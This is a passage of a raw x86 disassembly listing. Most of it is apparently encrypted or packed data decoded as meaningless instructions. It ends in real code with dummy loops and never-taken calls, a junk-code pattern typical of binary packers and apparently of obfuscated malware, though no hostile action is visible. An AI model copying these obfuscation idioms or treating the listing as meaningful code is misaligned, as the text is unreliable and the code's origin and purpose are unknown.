  414683:	fcom   st(4)
  414685:	cli    
  414686:	repz fsub st,st(5)
  414689:	clc    
  41468a:	add    eax,0xcac8fdc7
  41468f:	into   
  414690:	stc    
  414691:	into   
  414692:	rcr    al,cl
  414694:	mov    esp,0xb1bccdf5
  414699:	mov    bl,0xf5
  41469b:	cmc    
  41469c:	fdiv   st,st(1)
  41469e:	in     eax,dx
  41469f:	leave  
  4146a0:	fcom   st(4)
  4146a2:	aam    0x0
  4146a4:	idiv   BYTE PTR [esi-0x1af80b39]
  4146aa:	cld    
  4146ab:	(bad)  
  4146ac:	or     al,cl
  4146ae:	iret   
  4146af:	out    dx,eax
  4146b0:	call   0xe32a31ad
  4146b5:	out    0xe7,al
  4146b7:	stos   BYTE PTR es:[edi],al
  4146b8:	shr    ebx,0xc1
  4146bb:	sti    
  4146bc:	fidiv  WORD PTR [esi-0x44113025]
  4146c2:	loop   0x41469c
  4146c4:	int3   
  4146c5:	pop    es
  4146c6:	mov    ebx,0xddc604f7
  4146cb:	(bad)  
  4146cc:	enter  0xcbdc,0xc6
  4146d0:	or     BYTE PTR ds:0xc8acd8eb,al
  4146d6:	ret    
  4146d7:	loope  0x41468e
  4146d9:	mov    ch,0xd3
  4146db:	mov    dl,0xd7
  4146dd:	(bad)  
  4146e0:	clc    
  4146e1:	aad    0xdc
  4146e3:	aam    0xcf
  4146e5:	loop   0x4146a7
  4146e7:	loope  0x4146e7
  4146e9:	stc    
  4146ea:	loope  0x4146b5
  4146ec:	fucomi st,st(2)
  4146ee:	in     eax,dx
  4146ef:	retf   0x7e7
  4146f2:	test   al,0xae
  4146f4:	lods   eax,DWORD PTR ds:[esi]
  4146f5:	ret    0xdbe9
  4146f8:	out    dx,al
  4146f9:	lock jmp 0xf2b9:0xf5b9b5ea
  414701:	repnz mov edx,0xf0bddffd
  414707:	mov    ebp,0xeffffcff
  41470c:	aad    0xe3
  41470e:	fcmovne st,st(6)
  414710:	fld    st(0)
  414712:	rol    ecx,cl
  414714:	lock (bad) 
  414716:	imul   DWORD PTR [edx-0x3a303239]
  41471c:	cmc    
  41471d:	in     eax,dx
  41471e:	xlat   BYTE PTR ds:[ebx]
  41471f:	call   0xe4401a18
  414724:	div    ebp
  414726:	add    eax,DWORD PTR [edx]
  414728:	out    0x0,al
  41472a:	fdiv   st(2),st
  41472c:	(bad)  
  41472d:	or     bl,dl
  41472f:	(bad)  
  414731:	clc    
  414732:	iret   
  414733:	lock (bad) 
  414735:	enter  0xd5c9,0xf6
  414739:	mov    dl,0xf2
  41473b:	repnz push DWORD PTR [edi-0x3734080a]
  414742:	cmc    
  414743:	xlat   BYTE PTR ds:[ebx]
  414744:	mov    esp,0xd2d4f5d8
  414749:	(bad)  
  41474a:	(bad)  
  41474b:	aam    0xd8
  41474d:	(bad)  
  41474f:	out    dx,al
  414750:	loop   0x41471f
  414752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414753:	in     al,0xe2
  414755:	out    dx,al
  414756:	fst    st(4)
  414758:	ret    
  414759:	call   0xfe1afa11
  41475e:	(bad)  
  414760:	int3   
  414761:	loope  0x414724
  414763:	iret   
  414764:	icebp  
  414765:	repz (bad) 
  414768:	aam    0xdb
  41476a:	add    al,0xc4
  41476c:	fld    QWORD PTR [eax]
  41476e:	push   es
  41476f:	cld    
  414770:	leave  
  414771:	jmp    0xf8392963
  414776:	mov    ch,0xeb
  414778:	shr    edx,0xed
  41477b:	test   bh,0xca
  41477e:	sar    ecx,1
  414780:	loop   0x414779
  414782:	(bad)  
  414783:	mov    ebp,0xc3c2e2d9
  414788:	(bad)  
  414789:	mov    esp,0xdebd0f4
  41478e:	loop   0x414775
  414790:	out    0xd3,eax
  414792:	scas   eax,DWORD PTR es:[edi]
  414793:	out    0xc9,eax
  414795:	icebp  
  414796:	(bad)
  414799:	not    bl
  41479b:	in     al,dx
  41479c:	int3   
  41479d:	sti    
  41479e:	cld    
  41479f:	hlt    
  4147a0:	(bad)  
  4147a2:	sti    
  4147a3:	mov    esi,0xffe7e3d5
  4147a8:	test   esi,0xc0c8e2dc
  4147ae:	clc    
  4147af:	add    eax,0xc4caf9cc
  4147b4:	loope  0x414782
  4147b6:	scas   al,BYTE PTR es:[edi]
  4147b7:	aad    0xf6
  4147b9:	jmp    0xd03a30ae
  4147be:	stc    
  4147bf:	out    dx,eax
  4147c0:	mov    edi,0xb9bdf6bc
  4147c5:	shl    eax,1
  4147c7:	in     al,0xbd
  4147c9:	(bad)  
  4147cb:	jmp    0xb07:0xdfcfdee6
  4147d2:	lock fsub st(0),st
  4147d5:	shl    dh,0xce
  4147d8:	cli    
  4147d9:	jmp    0xcaf9:0xb9f0e7ba
  4147e0:	retf   
  4147e1:	div    DWORD PTR [edi-0x3e243327]
  4147e7:	add    edi,DWORD PTR [ecx+0x2e5eac0]
  4147ed:	add    cl,BYTE PTR [ebx]
  4147ef:	or     ebx,eax
  4147f1:	fdiv   DWORD PTR [ebx-0x221d1723]
  4147f7:	iret   
  4147f8:	iret   
  4147f9:	mov    al,0xc0
  4147fb:	fbstp  TBYTE PTR [eax-0x30204145]
  414801:	xlat   BYTE PTR ds:[ebx]
  414802:	loop   0x414805
  414804:	not    eax
  414806:	rcr    dh,cl
  414808:	mul    eax
  41480a:	retf   
  41480b:	(bad)  
  41480c:	inc    ebp
  41480e:	in     al,dx
  41480f:	out    dx,eax
  414810:	jmp    0x41480e
  414812:	out    dx,al
  414813:	leave  
  414814:	shl    ebp,1
  414816:	in     eax,dx
  414817:	(bad)  
  414818:	in     al,dx
  414819:	(bad)  
  41481a:	sti    
  41481b:	mov    dh,0xf4
  41481d:	in     eax,0xf2
  41481f:	shl    ah,cl
  414821:	xlat   BYTE PTR ds:[ebx]
  414822:	rol    bl,cl
  414824:	cli    
  414825:	fcmovnbe st,st(2)
  414827:	test   DWORD PTR [esi],0xdef6c5f0
  41482d:	add    eax,0xdcfc0fca
  414832:	int3   
  414833:	mov    eax,0xd5f5dcc4
  414838:	aam    0xf2
  41483a:	into   
  41483b:	mov    al,0xd9
  41483d:	mov    dh,0xb7
  41483f:	jmp    0x4147f6
  414841:	shr    edi,1
  414843:	(bad)  
  414845:	jecxz  0x414804
  414847:	loopne 0x41484d
  414849:	(bad)
  41484c:	in     al,0xfa
  41484e:	in     eax,0xf3
  414850:	out    0xee,al
  414852:	fcomip st,st(1)
  414854:	mov    bh,0xe7
  414856:	scas   eax,DWORD PTR es:[edi]
  414857:	ret    
  414858:	loope  0x41484d
  41485a:	fdiv   DWORD PTR [ecx-0x25244422]
  414860:	fdiv   st(3),st
  414862:	(bad)  
  414864:	rcr    edi,1
  414866:	xlat   BYTE PTR ds:[ebx]
  414867:	(bad)  
  414868:	in     eax,0xe3
  41486a:	fst    st(5)
  41486c:	out    dx,eax
  41486d:	(bad)  
  41486f:	fdiv   st(1),st
  414871:	or     ebx,esp
  414873:	retf   0xf3cc
  414876:	in     al,dx
  414877:	mov    bl,0xd3
  414879:	mov    ebx,0xcdf4c9f0
  41487e:	int3   
  41487f:	std    
  414880:	not    cl
  414882:	mov    esi,0xfcc3dad9
  414887:	fld    DWORD PTR [ebx]
  414889:	fucom  st(3)
  41488b:	aam    0xc9
  41488d:	(bad)  
  41488e:	call   0xba1a349c
  414893:	les    esi,FWORD PTR [ecx-0x52191d3b]
  414899:	out    0xef,al
  41489b:	rol    bh,1
  41489d:	jmp    0xe8bc:0xdfcbdcf4
  4148a4:	cmc    
  4148a5:	pop    es
  4148a6:	mov    esp,0x3deebeb
  4148ab:	(bad)  
  4148ac:	out    0xee,al
  4148ae:	retf   0xc9e2
  4148b1:	in     al,0xc5
  4148b3:	icebp  
  4148b4:	out    dx,al
  4148b5:	leave  
  4148b6:	call   0xeb373684
  4148bb:	mov    esp,0xd0cabaf7
  4148c1:	in     al,dx
  4148c2:	sar    al,1
  4148c4:	fiadd  WORD PTR [ebx]
  4148c6:	(bad)
  4148c9:	(bad)  
  4148ca:	jmp    0xc5fe:0xe7e4f8
  4148d1:	fld    st(0)
  4148d3:	bnd ret 
  4148d5:	out    0xb7,eax
  4148d7:	int3   
  4148d8:	retf   0xf9ce
  4148db:	(bad)  
  4148dc:	sti    
  4148dd:	sar    DWORD PTR [edx-0x10334436],1
  4148e3:	rol    ecx,cl
  4148e5:	icebp  
  4148e6:	lock mov edx,0xeae00acb
  4148ec:	(bad)  
  4148ee:	or     ch,ch
  4148f0:	int3   
  4148f1:	fucom  st(6)
  4148f3:	mov    dh,0xd2
  4148f6:	mov    cl,0xe6
  4148f8:	(bad)  
  4148f9:	(bad)  
  4148fb:	icebp  
  4148fc:	fyl2xp1 
  4148fe:	xlat   BYTE PTR ds:[ebx]
  4148ff:	fidivr DWORD PTR [edx-0x1c260d1e]
  414905:	icebp  
  414906:	(bad)  
  414907:	cli    
  414908:	sti    
  414909:	or     bl,dh
  41490b:	les    ecx,FWORD PTR [ebx]
  41490d:	or     edi,ebx
  41490f:	cld    
  414910:	retf   
  414911:	std    
  414912:	shr    dh,0xdc
  414915:	lock call 0xd6271bd2
  41491b:	mov    eax,0xfadaeed7
  414920:	in     eax,dx
  414921:	rol    ebx,1
  414923:	fcom   st(7)
  414925:	add    eax,DWORD PTR [edi]
  414927:	in     eax,0xff
  414929:	mov    BYTE PTR [edx*8-0x3fc2329],0xd8
  414931:	icebp  
  414932:	lock xlat BYTE PTR ds:[ebx]
  414934:	in     al,0xcd
  414936:	lods   eax,DWORD PTR ds:[esi]
  414937:	mov    bl,0xe1
  414939:	ror    eax,1
  41493b:	fcmovnbe st,st(4)
  41493d:	clc    
  41493e:	(bad)  
  41493f:	int3   
  414940:	fucom  st(2)
  414942:	fcomip st,st(2)
  414944:	add    ah,ch
  414946:	fnstsw WORD PTR [ebp-0x26f80b0c]
  41494c:	fxch   st(0)
  41494e:	or     BYTE PTR [ebx],cl
  414950:	in     eax,0xd9
  414952:	ror    cl,0xbf
  414955:	test   al,0xd2
  414957:	jmp    0xd618fb29
  41495c:	out    0xb4,al
  41495e:	call   0xe4380360
  414963:	mov    ecx,0xe3e3d4d2
  414968:	repz aam 0xde
  41496b:	jmp    0xe0fc:0xc4ef07fb
  414972:	test   al,0xcb
  414974:	lods   eax,DWORD PTR ds:[esi]
  414975:	jecxz  0x414965
  414977:	jmp    0xdae7:0xd8b2b4fa
  41497e:	lock repz lock cmc 
  414982:	repnz hlt 
  414984:	icebp  
  414985:	(bad)  
  414986:	inc    BYTE PTR [edi]
  414988:	lock ret 0xf9fe
  41498c:	(bad)  
  41498d:	out    0xdd,eax
  41498f:	add    bl,ah
  414991:	clc    
  414992:	repz shl ch,0xd7
  414996:	out    dx,eax
  414997:	ror    ecx,0xcc
  41499a:	retf   
  41499b:	retf   
  41499c:	(bad)  
  41499d:	cmc    
  41499e:	int    0xf9
  4149a0:	(bad)  
  4149a1:	out    dx,al
  4149a2:	lock inc cl
  4149a5:	add    bh,BYTE PTR [esi+0xb05b905]
  4149ab:	mov    esi,0xc8ecebdc
  4149b0:	loope  0x41498f
  4149b2:	mov    edi,0xcfd6bcee
  4149b7:	in     eax,dx
  4149b8:	leave  
  4149b9:	(bad)  
  4149ba:	in     eax,0xff
  4149bc:	idiv   bl
  4149be:	shr    esp,cl
  4149c0:	leave  
  4149c1:	std    
  4149c2:	mov    ecx,0xdbf7d2e1
  4149c7:	shl    esp,0xe2
  4149ca:	retf   
  4149cb:	jmp    0x2ec:0x1dffac6
  4149d2:	loopne 0x414985
  4149d4:	out    dx,eax
  4149d5:	ror    eax,0xd5
  4149d8:	shr    bh,0xeb
  4149db:	f2xm1  
  4149dd:	in     eax,0xef
  4149df:	jmp    0x4149cc
  4149e1:	hlt    
  4149e2:	leave  
  4149e3:	clc    
  4149e4:	mov    ch,0xe5
  4149e6:	add    al,0xe3
  4149e8:	add    edi,ebx
  4149ea:	add    ch,al
  4149ec:	fmul   st(0),st
  4149ee:	cld    
  4149ef:	stc    
  4149f0:	cld    
  4149f1:	add    ecx,edx
  4149f3:	ret    
  4149f4:	(bad)  
  4149f6:	shl    DWORD PTR [edx-0x281732],cl
  4149fc:	cmc    
  4149fd:	fstp   st(5)
  4149ff:	shl    edx,1
  414a01:	add    ebx,edi
  414a03:	std    
  414a04:	idiv   BYTE PTR [edi+esi*8-0x38fa3423]
  414a0b:	pop    es
  414a0c:	add    eax,DWORD PTR [edx+eax*1]
  414a0f:	cli    
  414a10:	loopne 0x4149ea
  414a12:	faddp  st(4),st
  414a14:	mov    bl,0xf5
  414a16:	into   
  414a17:	shr    ecx,0xe4
  414a1a:	mov    dh,0xcc
  414a1c:	sti    
  414a1d:	cli    
  414a1e:	(bad)  
  414a20:	mov    ecx,0xf7f5def4
  414a25:	out    0x7,eax
  414a27:	div    cl
  414a29:	std    
  414a2a:	std    
  414a2b:	call   0xdc3d2b07
  414a30:	in     al,0xed
  414a32:	mov    esp,0xabe0f6cd
  414a37:	rol    al,0xe5
  414a3a:	mov    bh,0xb0
  414a3c:	iret   
  414a3d:	sti    
  414a3e:	int    0xf8
  414a40:	mov    eax,0x7fdfaf8
  414a45:	aad    0xcd
  414a47:	rol    ah,0xfb
  414a4a:	jmp    0xc0b145a
  414a4f:	(bad)  
  414a50:	std    
  414a51:	int    0xc2
  414a53:	ret    0xe2ac
  414a56:	jmp    0x414a1b
  414a58:	aam    0xc6
  414a5a:	hlt    
  414a5b:	aad    0xf6
  414a5d:	cli    
  414a5e:	cmc    
  414a5f:	aam    0xdb
  414a61:	hlt    
  414a62:	repnz jecxz 0x414a3a
  414a65:	cli    
  414a66:	add    dl,dl
  414a68:	cld    
  414a69:	mov    eax,0xd4c801d4
  414a6e:	(bad)  
  414a70:	retf   
  414a71:	adc    bl,ah
  414a73:	jmp    0x414a5c
  414a75:	retf   
  414a76:	jecxz  0x414a26
  414a78:	mov    bl,0xf4
  414a7a:	clc    
  414a7b:	stc    
  414a7c:	mov    dh,0xf1
  414a7e:	in     al,dx
  414a7f:	(bad)  
  414a80:	(bad)  
  414a81:	loop   0x414a7d
  414a83:	mov    eax,0x106fbd4
  414a88:	add    bh,bl
  414a8a:	jmp    0xe82d4259
  414a8f:	(bad)  
  414a90:	stc    
  414a91:	adc    dh,cl
  414a93:	(bad)  
  414a94:	mov    bl,0xe3
  414a96:	xlat   BYTE PTR ds:[ebx]
  414a97:	in     eax,dx
  414a98:	mov    dl,0xe9
  414a9a:	repz scas al,BYTE PTR es:[edi]
  414a9c:	in     al,0xde
  414a9e:	mov    ebx,0xbbbaceca
  414aa3:	rcl    dl,0xed
  414aa6:	fcmovnu st,st(3)
  414aa8:	std    
  414aa9:	add    DWORD PTR [edx],ecx
  414aab:	aam    0x8
  414aad:	push   es
  414aae:	(bad)  
  414aaf:	in     al,dx
  414ab0:	or     DWORD PTR ds:0xf5a9adc6,eax
  414ab6:	loopne 0x414a9e
  414ab8:	mov    dl,0xf1
  414aba:	retf   
  414abb:	sti    
  414abc:	enter  0xe9f6,0xf2
  414ac0:	rcr    esp,cl
  414ac2:	fsubr  st(3),st
  414ac4:	int3   
  414ac5:	shl    ebp,cl
  414ac7:	mov    esi,0xd402c3f1
  414acc:	jmp    0xcb3e2ea7
  414ad1:	(bad)  
  414ad2:	retf   
  414ad3:	fdiv   QWORD PTR [edx-0x4390f2d]
  414ad9:	not    esp
  414adb:	out    dx,eax
  414adc:	repnz mov ah,0xff
  414adf:	into   
  414ae0:	mov    ch,0xf9
  414ae2:	ret    
  414ae3:	fdivr  st(7),st
  414ae5:	cld    
  414ae6:	mov    ebx,0xf9f405d7
  414aeb:	retf   0xe8ee
  414aee:	add    al,0xe1
  414af0:	fdiv   st(2),st
  414af2:	sar    BYTE PTR [esi-0x19133e43],cl
  414af8:	out    0xd1,eax
  414afa:	mov    bl,0xb7
  414afc:	out    dx,eax
  414afd:	icebp  
  414afe:	(bad)
  414b01:	jecxz  0x414ad5
  414b03:	fscale 
  414b05:	sti    
  414b06:	in     al,dx
  414b07:	cld    
  414b08:	sar    esi,1
  414b0a:	cld    
  414b0b:	neg    edi
  414b0d:	cld    
  414b0e:	fucomp st(5)
  414b10:	or     bh,ch
  414b12:	scas   eax,DWORD PTR es:[edi]
  414b13:	repnz rcl ecx,0xf0
  414b17:	out    0xec,al
  414b19:	(bad)  
  414b1a:	hlt    
  414b1b:	shl    BYTE PTR [esi+esi*4-0x130f1433],1
  414b22:	int3   
  414b23:	fsub   st,st(1)
  414b25:	mov    eax,0x2cbc0bc
  414b2a:	fiadd  WORD PTR ds:0xe0e3c4c0
  414b30:	out    dx,eax
  414b31:	loopne 0x414af1
  414b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b34:	jmp    0xea1738fb
  414b39:	cli    
  414b3a:	fsqrt  
  414b3c:	mov    ah,0xfb
  414b3e:	(bad)  
  414b40:	loop   0x414b0c
  414b42:	cli    
  414b43:	in     eax,dx
  414b44:	shl    ecx,0xc6
  414b47:	fcmovnu st,st(3)
  414b49:	add    bl,bh
  414b4b:	add    ebp,esp
  414b4d:	fld    DWORD PTR [edi]
  414b4f:	loope  0x414b4f
  414b51:	loopne 0x414b2f
  414b53:	retf   0xe8df
  414b56:	mov    bh,0xed
  414b58:	in     eax,dx
  414b59:	ret    0xe9f8
  414b5c:	fxch   st(4)
  414b5e:	enter  0xdde4,0xfc
  414b62:	(bad)  
  414b63:	(bad)  
  414b64:	fcmovnb st,st(3)
  414b66:	out    0xc5,al
  414b68:	out    0xd5,al
  414b6a:	jecxz  0x414b4e
  414b6c:	add    cl,BYTE PTR [edi]
  414b6e:	pinsrw mm1,eax,0xcd
  414b72:	fadd   st,st(2)
  414b74:	repz call 0xcbf33842
  414b7a:	in     al,0xec
  414b7c:	(bad)  
  414b7d:	(bad)  
  414b7f:	leave  
  414b80:	out    dx,al
  414b81:	enter  0xeec9,0xcd
  414b85:	shl    esi,1
  414b87:	ret    
  414b88:	shl    ah,0xfa
  414b8b:	std    
  414b8c:	stc    
  414b8d:	loop   0x414b63
  414b8f:	loope  0x414b7d
  414b91:	or     eax,0xd5c5d7af
  414b96:	rcl    ebx,1
  414b98:	sti    
  414b99:	div    ebp
  414b9b:	scas   al,BYTE PTR es:[edi]
  414b9c:	mov    eax,0xbff1bdec
  414ba1:	sar    edx,cl
  414ba3:	fdivr  QWORD PTR [edi-0x46004119]
  414ba9:	aam    0xc2
  414bab:	ret    0xd5e8
  414bae:	leave  
  414baf:	pop    es
  414bb0:	fcom   QWORD PTR [ebx]
  414bb2:	jecxz  0x414b95
  414bb4:	out    0xe2,al
  414bb6:	fadd   st(4),st
  414bb8:	hlt    
  414bb9:	mov    ch,0xee
  414bbb:	mov    edx,0xb2fdf3d1
  414bc0:	mov    edi,0xf707fce1
  414bc5:	(bad)  
  414bc6:	mov    ebx,0xbd702df
  414bcb:	fild   WORD PTR ds:0xeac60d08
  414bd1:	add    eax,0xefb1d7c5
  414bd6:	int    0xef
  414bd8:	mov    dh,0xe9
  414bda:	sti    
  414bdb:	mov    edx,0xdbd3e9f5
  414be0:	icebp  
  414be1:	jmp    0xecfa22e8
  414be6:	push   es
  414be7:	xlat   BYTE PTR ds:[ebx]
  414be8:	(bad)  
  414be9:	push   es
  414bea:	cli    
  414beb:	rol    BYTE PTR [edx+ebp*8],0xb
  414bef:	repz cli 
  414bf1:	retf   0xaecd
  414bf4:	mov    bh,0xf3
  414bf6:	rol    dh,1
  414bf8:	loopne 0x414bbe
  414bfa:	clc    
  414bfb:	mov    ch,0xad
  414bfd:	sti    
  414bfe:	std    
  414bff:	clc    
  414c00:	out    dx,eax
  414c01:	int3   
  414c02:	fstp   TBYTE PTR [eax+0x1c6d8b8]
  414c08:	loop   0x414bfb
  414c0a:	loop   0x414bf3
  414c0c:	loopne 0x414bd7
  414c0e:	(bad)  
  414c10:	out    dx,eax
  414c11:	out    0xde,al
  414c13:	rcr    bh,0xbe
  414c16:	retf   
  414c17:	enter  0xe6b1,0xc1
  414c1b:	int    0xe6
  414c1d:	mov    esi,0xffd5d9b6
  414c22:	mov    eax,0xd2d4dacd
  414c27:	aam    0xdd
  414c29:	or     eax,esp
  414c2b:	(bad)  
  414c2d:	cli    
  414c2e:	or     eax,0xbdf8e1e5
  414c33:	in     al,dx
  414c34:	loope  0x414c19
  414c36:	loopne 0x414be6
  414c38:	retf   
  414c39:	aad    0xe5
  414c3b:	in     al,dx
  414c3c:	test   esi,0xcef4bbdd
  414c42:	test   DWORD PTR [ecx],0xf1ccc3bd
  414c48:	add    ecx,DWORD PTR [edx]
  414c4a:	jecxz  0x414c57
  414c4c:	out    0xfa,al
  414c4e:	loope  0x414c5d
  414c50:	int    0xff
  414c52:	rcl    al,1
  414c54:	in     al,dx
  414c55:	mov    cl,0xdd
  414c57:	into   
  414c58:	shr    ecx,0xfa
  414c5b:	retf   0xbae8
  414c5e:	in     eax,dx
  414c5f:	mov    dl,0xcd
  414c61:	ret    0xdcb9
  414c64:	mov    ecx,0x1e405e5
  414c69:	lock aad 0xe4
  414c6c:	loope  0x414c53
  414c6e:	fimul  WORD PTR [eax]
  414c70:	retf   
  414c71:	adc    ah,BYTE PTR [edi-0x1e3d1740]
  414c77:	int3   
  414c78:	out    dx,eax
  414c79:	fxch   st(5)
  414c7b:	not    bh
  414c7d:	sar    bl,1
  414c7f:	repnz imul dl
  414c82:	add    ch,bh
  414c84:	lock fld st(2)
  414c87:	jmp    0x414c93
  414c89:	jecxz  0x414c62
  414c8b:	(bad)  
  414c8d:	enter  0x1ef,0xc4
  414c91:	cli    
  414c92:	(bad)  
  414c93:	out    dx,al
  414c94:	mov    dl,0xb6
  414c96:	(bad)  
  414c97:	enter  0xb1cb,0xd8
  414c9b:	mov    ch,0xad
  414c9d:	mov    dh,0xcd
  414c9f:	fdiv   st,st(0)
  414ca1:	fcmovu st,st(0)
  414ca3:	mov    edi,0xc6e1e0dc
  414ca8:	aam    0xc2
  414caa:	out    0xe3,al
  414cac:	add    ch,bh
  414cae:	add    bl,bh
  414cb0:	jecxz  0x414cb4
  414cb2:	lods   eax,DWORD PTR ds:[esi]
  414cb3:	ret    0xecee
  414cb6:	in     eax,dx
  414cb7:	hlt    
  414cb8:	test   eax,0xe8b4b6f9
  414cbd:	mov    ebx,0xf9f5f9cb
  414cc2:	(bad)  
  414cc3:	mov    esi,0xd4c3e7f7
  414cc8:	(bad)  
  414cca:	retf   
  414ccb:	pop    es
  414ccc:	jecxz  0x414ca8
  414cce:	pavgb  mm0,mm5
  414cd1:	push   cs
  414cd2:	jmp    0xeb0e15c3
  414cd7:	imul   DWORD PTR [ebp-0x262e4646]
  414cdd:	call   0x2401ead
  414ce2:	mov    eax,0xfdc6eed8
  414ce7:	mov    esi,0xe2f5f0f5
  414ced:	pop    es
  414cee:	or     bl,bl
  414cf0:	loopne 0x414ccc
  414cf2:	in     eax,dx
  414cf3:	rcl    dl,1
  414cf5:	mov    bl,0xe2
  414cf7:	(bad)  
  414cf8:	int3   
  414cf9:	mov    bh,0xcc
  414cfb:	jmp    0x414cd8
  414cfd:	fdivrp st(3),st
  414cff:	mov    esi,0xbdffb8f9
  414d04:	in     al,dx
  414d05:	add    al,al
  414d07:	(bad)  
  414d08:	jmp    0x414ce1
  414d0a:	loop   0x414cd4
  414d0c:	add    ah,ah
  414d0e:	fucomip st,st(3)
  414d10:	out    0xfe,eax
  414d12:	mov    ecx,0xb6bcacc2
  414d17:	(bad)  
  414d18:	mov    ch,0xc2
  414d1a:	mov    dl,0xe7
  414d1c:	fdivr  st,st(0)
  414d1e:	(bad)
  414d21:	mov    esp,0xdeb5b6d6
  414d26:	xlat   BYTE PTR ds:[ebx]
  414d27:	add    BYTE PTR [edi],al
  414d29:	fcomp  st(0)
  414d2b:	or     ebx,esi
  414d2d:	(bad)  
  414d2e:	iret   
  414d2f:	fcmovbe st,st(3)
  414d31:	in     al,dx
  414d32:	call   0xb2321ffc
  414d37:	jmp    0xd9d1:0xbbb3b6cf
  414d3e:	(bad)  
  414d3f:	mov    eax,0xecbeefc9
  414d44:	fst    st(5)
  414d46:	inc    BYTE PTR [eax+eax*1]
  414d49:	loope  0x414d24
  414d4b:	(bad)  
  414d4c:	leave  
  414d4d:	add    esi,ecx
  414d4f:	dec    eax
  414d51:	shl    bh,0xb8
  414d54:	fsubrp st(4),st
  414d56:	mov    cl,0xe0
  414d58:	ret    0xf6cb
  414d5b:	out    0xd1,al
  414d5d:	clc    
  414d5e:	(bad)  
  414d5f:	jmp    0x414d2f
  414d61:	iret   
  414d62:	jecxz  0x414d44
  414d64:	(bad)  
  414d65:	fst    st(5)
  414d67:	(bad)  
  414d68:	cmc    
  414d69:	jmp    0x5393478
  414d6e:	fmul   st,st(5)
  414d70:	fdiv   st(2),st
  414d72:	mov    esi,0xc0b6c3aa
  414d77:	(bad)
  414d7a:	rcr    cl,1
  414d7c:	imul   bl
  414d7e:	iret   
  414d7f:	repz mov ecx,0xf1b9f8c8
  414d85:	fnsetpm(287 only) 
  414d87:	repnz push ecx
  414d8a:	xlat   BYTE PTR ds:[ebx]
  414d8b:	cli    
  414d8c:	add    cl,BYTE PTR [ecx]
  414d8e:	enter  0xfcb,0xe7
  414d92:	repz leave 
  414d94:	iret   
  414d95:	mov    bh,0xd6
  414d97:	jecxz  0x414d82
  414d99:	mov    al,0xe6
  414d9b:	loopne 0x414d58
  414d9d:	jmp    0xfc251d9b
  414da2:	in     eax,dx
  414da3:	fild   DWORD PTR [edx]
  414da5:	rcl    esp,cl
  414da7:	(bad)  
  414da8:	fisttp DWORD PTR [edx]
  414daa:	cld    
  414dab:	sar    cl,1
  414dad:	call   0xe3475097
  414db2:	retf   
  414db3:	lods   eax,DWORD PTR ds:[esi]
  414db4:	leave  
  414db5:	into   
  414db6:	icebp  
  414db7:	loopne 0x414d9d
  414db9:	aam    0xc6
  414dbb:	int3   
  414dbc:	stc    
  414dbd:	lock mov ah,0xf6
  414dc0:	(bad)  
  414dc1:	fcmove st,st(7)
  414dc3:	(bad)  
  414dc4:	in     eax,dx
  414dc5:	jecxz  0x414db4
  414dc7:	fsubrp st(5),st
  414dc9:	lock or esi,DWORD PTR [ebx]
  414dcc:	fisttp DWORD PTR [ebx+0x3434ad4]
  414dd2:	sbb    al,0x1a
  414dd4:	dec    ebx
  414dd5:	xor    edx,edx
  414dd7:	add    DWORD PTR [ebp-0x1c],ebx
  414dda:	pop    ebx
  414ddb:	mov    eax,DWORD PTR [ebp-0x1c]
  414dde:	pop    esi
  414ddf:	pop    ebx
  414de0:	leave  
  414de1:	ret    0x10
  414de4:	push   ebp
  414de5:	mov    ebp,esp
  414de7:	sub    esp,0x64
  414dea:	sub    DWORD PTR ds:0x43776f,ecx
  414df0:	mov    DWORD PTR [ebp-0x8],0xf89f85b0
  414df7:	lea    eax,[ebp+0x14]
  414dfa:	xor    ecx,DWORD PTR ds:0x437737
  414e00:	mov    DWORD PTR [ebp-0x14],eax
  414e03:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  414e0a:	mov    DWORD PTR ds:0x4377b7,0x16
  414e14:	cmp    DWORD PTR ds:0x4377b7,0x0
  414e1b:	je     0x414e6a
  414e21:	cmp    DWORD PTR ds:0x4377b7,0xa
  414e28:	jle    0x414e6a
  414e2e:	jmp    0x414e3c
  414e33:	push   DWORD PTR [ebp-0xc]
  414e36:	call   DWORD PTR ds:0x43c9d4
  414e3c:	cmp    DWORD PTR ds:0x4377b7,0xb
  414e43:	jne    0x414e56
  414e49:	mov    ecx,DWORD PTR ds:0x4377b7
  414e4f:	dec    ecx
  414e50:	mov    DWORD PTR ds:0x4377b7,ecx
  414e56:	xor    ecx,ecx
  414e58:	add    ecx,DWORD PTR ds:0x4377b7
  414e5e:	dec    ecx
  414e5f:	mov    DWORD PTR ds:0x4377b7,ecx
  414e65:	jmp    0x414e14
  414e6a:	lea    eax,[ebp-0x4]
  414e6d:	mov    DWORD PTR [ebp-0x10],eax
  414e70:	and    DWORD PTR ds:0x4377bb,0x67f5
  414e7a:	mov    eax,DWORD PTR [ebp-0x4]
  414e7d:	and    DWORD PTR ds:0x437757,0x0
  414e87:	mov    ecx,DWORD PTR ds:0x437757
  414e8d:	inc    ecx
  414e8e:	mov    DWORD PTR ds:0x437757,ecx
  414e94:	cmp    DWORD PTR ds:0x437757,0xc
  414e9b:	ja     0x414ed8
  414ea1:	jmp    0x414eb1
  414ea6:	push   0x437723
  414eab:	call   DWORD PTR ds:0x43c9dc
  414eb1:	cmp    DWORD PTR ds:0x437757,0xb
  414eb8:	jne    0x414ecb
  414ebe:	mov    ecx,DWORD PTR ds:0x437757
  414ec4:	inc    ecx
  414ec5:	mov    DWORD PTR ds:0x437757,ecx
  414ecb:	cmp    DWORD PTR ds:0x437757,0x12
  414ed2:	jb     0x414e87
  414ed8:	xor    eax,0x75108b5
  414edd:	add    eax,0x3272fb
  414ee2:	neg    ecx
  414ee4:	mov    ecx,DWORD PTR [ebp-0x10]
  414ee7:	neg    DWORD PTR ds:0x437757
  414eed:	mov    DWORD PTR [ecx],eax
  414eef:	mov    DWORD PTR ds:0x43775b,0x15
  414ef9:	cmp    DWORD PTR ds:0x43775b,0x0
  414f00:	je     0x414f37
  414f06:	cmp    DWORD PTR ds:0x43775b,0x1f
  414f0d:	jg     0x414f37
  414f13:	jmp    0x414f23
  414f18:	push   0x3993
  414f1d:	call   DWORD PTR ds:0x43c9e0
  414f23:	xor    ecx,ecx
  414f25:	xor    ecx,DWORD PTR ds:0x43775b
  414f2b:	dec    ecx
  414f2c:	mov    DWORD PTR ds:0x43775b,ecx
  414f32:	jmp    0x414ef9
  414f37:	xor    eax,eax
  414f39:	add    DWORD PTR ds:0x437773,ecx
  414f3f:	mov    eax,ds:0x437217
